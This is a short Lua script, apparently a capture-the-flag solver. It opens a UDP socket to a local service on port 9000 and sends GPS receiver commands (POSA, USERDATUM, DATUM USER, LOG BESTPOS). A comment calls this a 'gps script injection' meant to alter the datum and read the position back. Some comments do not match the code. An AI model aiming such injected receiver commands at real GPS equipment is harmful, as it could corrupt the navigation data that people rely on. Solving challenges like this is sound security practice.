-- UDP is passed in as an arg
local args = {...}
local udp = select(1  , ... )
local print = select(2, ... )
udp:settimeout( 10 )

assert(udp:setsockname("*",0))
assert(udp:setpeername("127.0.0.1", 9000))

print("Dear santa id like cookies plzthx")

-- Solver steps
local cmd = string.pack( "b", 0)
local data = "POSA ONCE\r\nUSERDATUM 6378206.0 294.97 0.0 0.0 0.0 0.0 0.0 3.14 0.0\r\nLOG BESTPOS"
udp:send( cmd ) -- send 1 byte that is 3 
udp:send( data ) -- send a message to lol at
-- do a gps script injection that uses the frame we setup
local cmd = string.pack( "b", 0)
udp:send( cmd )
-- log best**posa once\r\ndatum user\r\nbestpos**a once
udp:send("POSA ONCE\r\nDATUM USER\r\nBESTPOS")

print("Omnomnom")